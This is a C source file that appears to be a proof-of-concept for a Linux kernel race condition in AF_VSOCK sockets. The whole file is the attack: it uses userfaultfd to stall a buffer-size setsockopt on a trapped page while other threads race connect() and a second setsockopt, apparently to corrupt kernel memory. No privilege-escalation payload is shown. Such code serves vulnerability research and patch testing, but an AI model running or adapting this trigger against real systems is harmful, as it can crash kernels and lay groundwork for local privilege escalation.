#define _GNU_SOURCE

#include <time.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <linux/userfaultfd.h>

#define USERFAULTFD_SYSNO	323
#define MAGICPAGE		((void*)0x444342414000)
#define PAGELEN			0x1000

int start_server()
{
	int s = -1;
	struct sockaddr_vm addr = {0};

	addr.svm_family = AF_VSOCK;
	addr.svm_port = 1234;
	addr.svm_cid = VMADDR_CID_LOCAL;

	s = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (s == -1) {
		perror("server socket");
		goto ERR_END;
	}

	if (bind(s, (struct sockaddr*)&addr, sizeof(addr))) {
		perror("server bind");
		close(s);
		s = -1;
		goto ERR_END;
	}

	if (listen(s, 1)) {
		perror("server listen");
		goto ERR_END;
	}

	return s;
ERR_END:
	if (s != -1) {
		close(s);
	}
	
	return -1;
}

typedef struct {
	int sock;
	sem_t* sem;	
} writerarg;
void* writer(void* arg)
{
	int ret = 0;
	writerarg* warg = (writerarg*)arg;
	uint64_t val = 0x4141;
	// we could set the max and min first so we aren't limited to between 0x80 - 0x40000?

	sem_wait(warg->sem);

	printf("Writing\n");

	if (setsockopt(warg->sock, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &val, sizeof(val))) {
		perror("writer setsockopt");
		ret = -1;
	}

	printf("Write Done\n");

	return (void*)(ssize_t)ret;
}

typedef struct {
	int sock;
	sem_t* sem;	
} connecterarg;
void* connecter(void* arg)
{
	int ret = 0;
	connecterarg* carg = (connecterarg*)arg;
	struct sockaddr_vm addr = {0};

	addr.svm_family = AF_VSOCK;
	addr.svm_port = 5678;
	addr.svm_cid = VMADDR_CID_HOST + 3;

	sem_wait(carg->sem);

	printf("Connecting\n");

	if (connect(carg->sock, (struct sockaddr*)&addr, sizeof(addr))) {
		perror("connecter connect");
	}	

	printf("Connecter Done\n");

	return (void*)(ssize_t)ret;
}

typedef struct {
	int sock;
	void* futureaddr;
} gaterarg;
void* gater(void* arg)
{
	int ret = 0;
	gaterarg* garg = (gaterarg*)arg;

	if (setsockopt(garg->sock, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, garg->futureaddr, sizeof(uint64_t))) {
		perror("gater setsockopt");
		ret = -1;
	}

	printf("Gate Done\n");

	return (void*)(ssize_t)ret;
}

int hitit()
{
	int res = -1;
	int s = -1;
	struct sockaddr_vm addr = {0};
	pthread_t wtid;
	pthread_t ctid;
	pthread_t gtid;
	sem_t writer_sem;
	sem_t connecter_sem;
	writerarg warg;
	connecterarg carg;
	gaterarg garg;
	int faultfd = -1;
	struct uffdio_api ufapi;
	struct uffdio_register ufreg;
	struct uffd_msg fmsg;
	struct uffdio_zeropage go;
	void* magicaddr;
	ssize_t nread;
	struct timeval timeout;

	addr.svm_family = AF_VSOCK;
	addr.svm_port = 1234;
	addr.svm_cid = VMADDR_CID_LOCAL;

	s = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (s == -1) {
		perror("socket");
		goto END;
	}


	timeout.tv_sec = 0;
	timeout.tv_usec = 100;
	if (setsockopt(s, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT, &timeout, sizeof(timeout))) {
		perror("timeout setsockopt");
		goto END;
	}

	if (connect(s, (struct sockaddr*)&addr, sizeof(addr))) {
		perror("inital connect");
	}
	
	printf("Connect1...\n");

	
	// create & setup userfaultd
	faultfd = syscall(323, 0);
	if (faultfd < 0) {
		perror("userfaultfd");
		goto END;
	}

	ufapi.api = UFFD_API;
	ufapi.features = 0;

	if (ioctl(faultfd, UFFDIO_API, &ufapi) == -1) {
		perror("ioctl UFFDIO_API");
		goto END;
	}

	// allocate the untouched memory
	magicaddr = mmap(MAGICPAGE, PAGELEN, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (magicaddr == MAP_FAILED) {
		perror("mmap");
		goto END;
	}

	ufreg.range.start = (uint64_t)magicaddr;
	ufreg.range.len = PAGELEN;
	ufreg.mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(faultfd, UFFDIO_REGISTER, &ufreg)) {
		perror("ioctl UFFDIO_REGISTER");
		goto END;
	}

	// initalize semaphores
	if (sem_init(&writer_sem, 0, 0)) {
		perror("writer sem_init");
		goto END;
	}

	if (sem_init(&connecter_sem, 0, 0)) {
		perror("connecter sem_init");
		goto END;
	}

	// start connecter	
	carg.sock = s;
	carg.sem = &connecter_sem;
	if (pthread_create(&ctid, NULL, connecter, (void*)&carg)) {
		perror("connecter pthread_create");
		goto END;
	}

	// start writer	
	warg.sock = s;
	warg.sem = &writer_sem;
	if (pthread_create(&wtid, NULL, writer, (void*)&warg)) {
		perror("writer pthread_create");
		goto END;
	}

	// start gater
	garg.sock = s;
	garg.futureaddr = magicaddr;
	if (pthread_create(&gtid, NULL, gater, (void*)&garg)) {
		perror("gater pthread_create");
		goto END;
	}
	
	// wait on userfault
	nread = read(faultfd, &fmsg, sizeof(fmsg));
	if (nread < 0) {
		perror("userfaultfd read");
		goto END;
	} else if (nread == 0) {
		fprintf(stderr, "EOF for userfault fd?\n");
		goto END;
	}

	if (fmsg.event != UFFD_EVENT_PAGEFAULT) {
		fprintf(stderr, "Got weird event %d\n", fmsg.event);
		goto END;
	}

	if ((fmsg.arg.pagefault.address < (uint64_t)magicaddr) || (fmsg.arg.pagefault.address >= (uint64_t)(magicaddr+PAGELEN))) {
		fprintf(stderr, "Got strange address for fault %p\n", (void*)fmsg.arg.pagefault.address);
		goto END;
	}
	printf("Got the fault!\n");
	
	sem_post(&connecter_sem);
	
	sem_post(&writer_sem);

	// wait a touch
	printf("Press 'g' to handle the fault\n");
	while (getchar() != 'g') {};

	// specify fault as handled
	go.range.start = (uint64_t)magicaddr;
	go.range.len = PAGELEN;
	go.mode = 0;

	if (ioctl(faultfd, UFFDIO_ZEROPAGE, &go)) {
		perror("ioctl UFFDIO_ZEROPAGE");
		goto END;
	}
	if (go.zeropage < 0) {
		fprintf(stderr, "Got zeropage error: %llx\n", -go.zeropage);
		goto END;
	}
	else if (go.zeropage != PAGELEN) {
		fprintf(stderr, "Got strange amount zeroed: %llx\n", go.zeropage);
		goto END;
	}

	res = 0;
END:
	if (faultfd >= 0) {
		close(faultfd);
	}

	if (s >= 0) {
		close(s);
	}

	return res;

}

int main(int argc, char* argv[])
{
	int res = -1;
	int server = -1;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	if (argc > 1 && !strcmp(argv[1], "-load")) {
		server = start_server(0);
		if (server == -1) {
			fprintf(stderr, "Did not start server\n");
			goto END;
		}

		// end early, we just wanted to get the ko's loaded
		fprintf(stderr, "vsock used\n");
		res = 0;
		goto END;
	}

	res = hitit();

	printf("Res %d\nPress 'q' to close the process...\n", res);
	while (getchar() != 'q') {};

END:
	return res;
}
